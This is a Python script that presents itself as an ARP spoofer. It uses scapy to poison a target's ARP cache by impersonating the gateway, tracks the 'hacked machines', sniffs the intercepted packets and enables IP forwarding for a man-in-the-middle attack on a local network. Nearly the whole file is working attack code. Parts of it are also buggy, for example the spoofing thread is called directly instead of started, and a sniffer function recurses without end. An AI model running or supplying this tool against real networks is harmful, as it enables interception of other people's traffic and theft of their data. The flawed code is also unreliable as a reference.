import scapy
import netifaces as ni
import threading 
import time 
import binascii
import subprocess
from time import sleep
from scapy.all import *
import argparse

# Global variables
attacker_mac = ""
hacked_machines = []
verbose = False

# get the mac address by broadcasting ARP to target ip
def getMacAddress(ip)->str:

	target_mac 	= "ff:ff:ff:ff:ff:ff" # broadcast request 
	ether 		= Ether(dst=target_mac)
	arp 		= ARP(pdst=ip) 
	
	packet = ether/arp
	
	result = srp(packet, timeout=7, verbose=False )[0] # use srp to send and recieve arp rq

	for sent, received in result:
        	return received.hwsrc
	pass


def print_status(message):
    """Print status messages if verbose mode is enabled."""
    if verbose:
        print(f"[*] {message}")

def print_success(message):
    """Print success messages."""
    print(f"[+] {message}")

def print_error(message):
    """Print error messages."""
    print(f"[!] {message}", file=sys.stderr)

def get_own_ip_addresses():
    """
    Get all IPv4 addresses of the local machine that are not loopback.
    
    Returns:
        list: A list of IP addresses.
    """
    ip_list = []
    try:
        interfaces = ni.interfaces()
        for interface in interfaces:
            if ni.AF_INET in ni.ifaddresses(interface):
                for address in ni.ifaddresses(interface)[ni.AF_INET]:
                    if 'addr' in address and address['addr'] != '127.0.0.1':
                        ip_list.append(address['addr'])
        return ip_list
    except Exception as e:
        print_error(f"Error getting IP addresses: {e}")
        return []

 

def get_own_mac_address(interface):
    """
    Get the MAC address of a specific interface.
    
    Args:
        interface (str): The network interface.
        
    Returns:
        str: The MAC address of the interface.
    """
    return ni.ifaddresses(interface)[ni.AF_LINK][0]['addr']

def spoof(target_ip, spoof_ip, attacker_mac, victim_mac):
    """
    Send ARP spoofing packets to target IP.
    
    Args:
        target_ip (str): The target IP address.
        spoof_ip (str): The IP to spoof (usually the gateway).
        attacker_mac (str): The MAC address of the attacker.
    """
    print_status(f"Spoofing {target_ip} ({victim_mac}) by pretending to be {spoof_ip}")
    ether = Ether(dst=victim_mac, src=attacker_mac)
    arp = ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=victim_mac, hwsrc=attacker_mac)

    if [target_ip, victim_mac] not in hacked_machines:
            hacked_machines.append([target_ip, victim_mac])
            print_success(f"Added {target_ip} to hacked machines list")
        
    packet = ether / arp
    sendp(packet, verbose=0)
    return

def packet_analyzer(packet):
    """
    Analyze intercepted packets.
    
    Args:
        packet: The packet to analyze.
    """
    print("Packet captured")
    if Ether in packet and IP in packet:
            src_mac = packet[Ether].src
            dst_mac = packet[Ether].dst
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            
            print_status(f"Packet: {src_ip} ({src_mac}) -> {dst_ip} ({dst_mac})")
            
            for ip, mac in hacked_machines:
                if ip == dst_ip:
					# only works on linux and tested on ubuntu
                        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def start_sniffer():
    """
    Start sniffing packets on the network.
    """
    print_status("Starting packet sniffer...")
    sniff( prn=packet_analyzer)


def parse_arguments():
    """
    Parse command-line arguments.
    
    Returns:
        argparse.Namespace: The parsed arguments.
    """
    parser = argparse.ArgumentParser(description="ARP Spoofer - A tool for ARP spoofing attacks\nExample: sudo python3 ARP_POISION.py -i <interface> -t <target_ip> -g <gateway_ip>")
    
    parser.add_argument("-t", "--target", help="Target IP address", required=True)
    parser.add_argument("-g", "--gateway", help="Gateway IP address to spoof", required=True)
    parser.add_argument("-i", "--interface", help="Network interface to use", required=True)
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--interval", type=int, default=2, help="Interval between spoofing packets in seconds (default: 2)")
    
    return parser.parse_args()

def main():
    """
    Main function to run the ARP spoofer.
    """
    global attacker_mac, verbose

    args = parse_arguments()
    verbose = args.verbose
    attacker_mac = get_own_mac_address(args.interface)

    print_success(f"Target IP: {args.target}")
    print_success(f"Gateway IP: {args.gateway}")
    print_success(f"Interface: {args.interface}")
    print_success(f"Attacker MAC: {attacker_mac}")
    print_success(f"Interval: {args.interval} seconds")
    
    print_status("Starting ARP spoofing...")
    victim_mac = getMacAddress(args.target)
    def start_spoofing():
        while True:
            spoof(args.target, args.gateway, attacker_mac, victim_mac)
            sleep(2)

    spoof_thread = threading.Thread(
		target=start_spoofing(), args=())
    spoof_thread.start()

    def start_sniffer():
        while True:
            start_sniffer()
    print_status("Starting packet sniffer...")
    sniffer_thread = threading.Thread(target=start_sniffer)
    sniffer_thread.start()


if __name__ == "__main__":

    if os.geteuid() != 0:
        print_error("This script must be run as root (sudo). Exiting.")
        sys.exit(1)
    
    main()